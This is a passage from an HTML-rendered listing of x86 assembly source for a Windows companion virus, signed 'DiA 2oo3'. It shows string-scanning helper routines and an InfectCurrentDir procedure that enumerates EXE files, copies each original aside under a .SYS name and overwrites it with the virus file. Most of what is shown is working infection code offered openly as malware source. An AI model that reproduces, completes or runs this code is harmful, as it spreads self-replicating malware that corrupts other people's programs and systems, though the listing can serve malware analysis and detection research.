</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----GetPoint Procedure--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GetPoint</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">PointFound</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetPoint</span><span class="sc0">
</span><span class="sc5">PointFound</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----GetPoint Procedure-END----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----GetSlash Procedure--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GetSlash</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">SlashFound</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetSlash</span><span class="sc0">
</span><span class="sc5">SlashFound</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----GetSlash Procedure-END----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----InfectCurrentDir Procedure------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">InfectCurrentDir</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">         </span><span class="sc1">;find exe files</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EXEmask</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindFirstFileA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXEfindhandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;save handle</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">

</span><span class="sc5">FindNextEXE</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;no more?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">InfectDone</span><span class="sc0">                   </span><span class="sc1">;yes-&gt;exit</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HostFile</span><span class="sc0">                </span><span class="sc1">;not needed</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">                   </span><span class="sc1">;copy string</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HostFile</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetPoint</span><span class="sc0">                   </span><span class="sc1">;get point to rename it</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">5359532Eh</span><span class="sc0">           </span><span class="sc1">;SYS.</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                      </span><span class="sc1">;do't copy if *.sys already exist</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HostFile</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;copy alwayss</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AssiFile</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">         </span><span class="sc1">;more hosts!</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXEfindhandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindNextFileA</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FindNextEXE</span><span class="sc0">

</span><span class="sc5">InfectDone</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----InfectCurrentDir Procedure-END--------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Foot----------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Assi</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Foot-END------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------by DiA (c)2oo3 [Germany]----------</span></div></body>
</html>
